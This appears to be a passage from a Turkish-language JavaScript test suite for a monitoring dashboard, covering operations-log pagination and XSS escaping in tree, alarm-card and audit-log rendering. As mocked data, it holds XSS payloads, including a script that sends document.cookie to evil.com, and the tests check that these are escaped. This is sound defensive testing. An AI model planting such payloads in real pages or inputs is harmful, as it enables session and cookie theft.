    await app.operasyonGunluguYukle();

    // En son 30 kayıt: ID 31'den 60'a kadar olmalıdır! 1'den 30'a değil!
    assert.equal(app.state.gecisler.length, 30);
    assert.equal(app.state.gecisler[0].id, 31, 'İlk gösterilen geçiş 31 olmalı');
    assert.equal(app.state.gecisler[29].id, 60, 'Son geçiş 60 olmalı');

    // 61 numaralı geçiş geldiğinde 32-61 görünmeli
    await app.operasyonGunluguYukle();
    assert.equal(app.state.gecisler.length, 30);
    assert.equal(app.state.gecisler[0].id, 32, '61 sonrası ilk gösterilen 32 olmalı');
    assert.equal(app.state.gecisler[29].id, 61, '61 sonrası son gösterilen 61 olmalı');

    // TEK BİR YENİLEMEDE 50'DEN FAZLA YENİ GEÇİŞ (65 yeni kayıt: 62..126) SENARYOSU:
    // İlk sayfa 50 kayıt (62..111, sonraki: 111), ikinci sayfa 15 kayıt (112..126, sonraki: null).
    // Kod tek sayfayla yetinmeyip iki sayfayı da çekmeli ve 126'ya kadar olan son 30 kaydı göstermelidir!
    const yeni65Gecis = Array.from({ length: 65 }, (_, i) => ({
        id: 62 + i,
        anomali_id: `ANOM-${62 + i}`,
        zaman: '2026-09-19T10:10:00Z',
        alan: 'durum',
        yeni: 'onaylandi',
        aktor: 'operator_bulk'
    }));

    let sayfaSayisi = 0;
    global.fetch = async (url) => {
        if (url.includes('/gecisler?sonra=61')) {
            sayfaSayisi++;
            return {
                ok: true,
                json: async () => ({
                    veriler: yeni65Gecis.slice(0, 50),
                    sonraki: 111,
                    limit: 50
                })
            };
        }
        if (url.includes('/gecisler?sonra=111')) {
            sayfaSayisi++;
            return {
                ok: true,
                json: async () => ({
                    veriler: yeni65Gecis.slice(50),
                    sonraki: null,
                    limit: 50
                })
            };
        }
        return { ok: false, status: 404 };
    };

    await app.operasyonGunluguYukle();

    assert.equal(sayfaSayisi, 2, "50'den fazla yeni kayıt için sonraki sayfalar da çekilmelidir");
    assert.equal(app.state.gecisler.length, 30, "Maksimum 30 geçiş tutulmalı");
    assert.equal(app.state.gecisler[0].id, 97, "97..126 arasındaki son 30 kaydın ilki 97 olmalıdır");
    assert.equal(app.state.gecisler[29].id, 126, "Son kayıt 126 olmalıdır");
    assert.equal(app.state.sonGecisId, 126, "Son geçiş ID 126 olmalıdır");

    // Günlük isteği hata verirse eski liste korunmalı ve hata bildirilmeli
    global.fetch = async () => ({ ok: false, status: 500 });
    await app.operasyonGunluguYukle();
    assert.equal(app.state.gunlukHata, true, 'Günlük hatası bayrağı set edilmeli');
    assert.equal(app.state.gecisler.length, 30, 'Eski liste korunmalı');
});

test('UI-08: HTML enjeksiyonu, XSS koruması ve gerçek DOM render doğrulaması', async () => {
    setupMockEnvironment();
    const app = await loadApp();

    // 1. escapeHtml fonksiyonu birim testleri
    const zararliGerekce = '<script>alert("xss")</script><img src=x onerror=alert(1)>';
    const guvenli = app.escapeHtml(zararliGerekce);

    assert.doesNotMatch(guvenli, /<script>/, 'Script etiketi kaçışlanmalı');
    assert.doesNotMatch(guvenli, /<img/, 'Img etiketi kaçışlanmalı');
    assert.match(guvenli, /&lt;script&gt;/, 'Güvenli HTML formatında olmalı');

    const tirnakliId = "MODUL'--DROP\"<test>";
    const kacisliTirnak = app.escapeHtml(tirnakliId);
    assert.match(kacisliTirnak, /&#39;/, 'Tek tırnak kaçışlanmalı');
    assert.match(kacisliTirnak, /&quot;/, 'Çift tırnak kaçışlanmalı');

    // 2. Ağaç Görünümü (hiyerarsiyiYukle) Gerçek DOM Enjeksiyon Testi:
    // Saha adı, pano adı ve modül kimliğinde XSS yükleri yer aldığında DOM'a çalıştırılabilir script/img girmemelidir
    global.fetch = async (url) => {
        if (url.includes('/sahalar')) {
            return {
                ok: true,
                json: async () => ({
                    sahalar: [{
                        saha_kodu: '<script>alert("saha_xss")</script>',
                        ad: '<img src=x onerror=alert("saha_img")>',
                        panolar: [{
                            pano_kodu: '<iframe src=javascript:alert("pano")></iframe>',
                            ad: '<b>Kalın Pano</b>',
                            moduller: [{
                                modul_id: '<b onmouseover=alert(1)>MOD-XSS</b>',
                                aktif: true,
                                seviye: 'normal'
                            }]
                        }]
                    }]
                })
            };
        }
        if (url.includes('/moduller')) {
            return {
                ok: true,
                json: async () => ({ veriler: [], ofset: 0, toplam: 0, limit: 50 })
            };
        }
        return { ok: false, status: 404 };
    };

    await app.hiyerarsiyiYukle();
    const treeContainer = document.getElementById('hierarchy-container');
    assert.doesNotMatch(treeContainer.innerHTML, /<script\b/i, "Ağaç renderında <script> etiketi çalışabilir halde bulunmamalıdır");
    assert.doesNotMatch(treeContainer.innerHTML, /<img\s/i, "Ağaç renderında <img> etiketi bulunmamalıdır");
    assert.doesNotMatch(treeContainer.innerHTML, /<iframe\b/i, "Ağaç renderında <iframe> bulunmamalıdır");
    assert.match(treeContainer.innerHTML, /&lt;script&gt;/, "Script zararlısı kaçışlı entity olmalı");
    assert.match(treeContainer.innerHTML, /&lt;img/, "Img zararlısı kaçışlı entity olmalı");

    // 3. Alarm Kartları (alarmlariYukle) Gerçek DOM Enjeksiyon Testi:
    // Anomali gerekçesi veya modül ID zararlı HTML içerdiğinde textContent veya kaçış ile güvenli basılmalıdır
    const xssAnomali = [{
        id: '<script>alert("anom_id")</script>',
        modul_id: '<img src=x onerror=alert("modul_id")>',
        sira: 1,
        seviye: 'kritik',
        durum: 'acik',
        tip: 'termal_sicak_nokta',
        gerekce: '<svg onload=alert("gerekce_xss")><a href="javascript:alert(1)">Tıkla</a>'
    }];

    global.fetch = async (url) => {
        if (url.includes('/anomaliler?durum=acik')) {
            return {
                ok: true,
                json: async () => ({ veriler: xssAnomali, sonraki: null, limit: 50 })
            };
        }
        if (url.includes('/anomaliler?durum=onaylandi')) {
            return {
                ok: true,
                json: async () => ({ veriler: [], sonraki: null, limit: 50 })
            };
        }
        return { ok: false, status: 404 };
    };

    await app.alarmlariYukle();
    const alarmsContainer = document.getElementById('alarms-container');
    assert.doesNotMatch(alarmsContainer.innerHTML, /<svg\b/i, "Alarm kartı renderında <svg> etiketi bulunmamalıdır");
    assert.doesNotMatch(alarmsContainer.innerHTML, /<script\b/i, "Alarm kartı renderında <script> etiketi bulunmamalıdır");
    assert.doesNotMatch(alarmsContainer.innerHTML, /<a\s/i, "Alarm kartı renderında <a> etiketi bulunmamalıdır");
    assert.match(alarmsContainer.innerHTML, /&lt;svg/, "Svg etiketi kaçışlı basılmalıdır");

    // 4. Operasyon Günlüğü (operasyonGunluguYukle) Gerçek DOM Enjeksiyon Testi:
    // Aktor ve alanlarda XSS yükleri yer aldığında audit-container içine kaçışlı basılmalıdır
    app.state.sonGecisId = null;
    app.state.gecisler = [];
    global.fetch = async (url) => {
        if (url.includes('/gecisler')) {
            return {
                ok: true,
                json: async () => ({
                    veriler: [{
                        id: 1,
                        anomali_id: '<img src=x onerror=alert("audit_anom")>',
                        zaman: '2026-09-19T10:00:00Z',
                        alan: 'durum',
                        yeni: 'onaylandi',
                        aktor: '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>'
                    }],
                    sonraki: null,
                    limit: 50
                })
            };
        }
        return { ok: false, status: 404 };
    };

    await app.operasyonGunluguYukle();
    const auditContainer = document.getElementById('audit-container');
    assert.doesNotMatch(auditContainer.innerHTML, /<script\b/i, "Operasyon günlüğü renderında <script> bulunmamalıdır");
    assert.doesNotMatch(auditContainer.innerHTML, /<img\s/i, "Operasyon günlüğü renderında <img> bulunmamalıdır");
    assert.match(auditContainer.innerHTML, /&lt;script&gt;/, "Operasyon günlüğü renderında kaçışlı HTML entity olmalıdır");
});
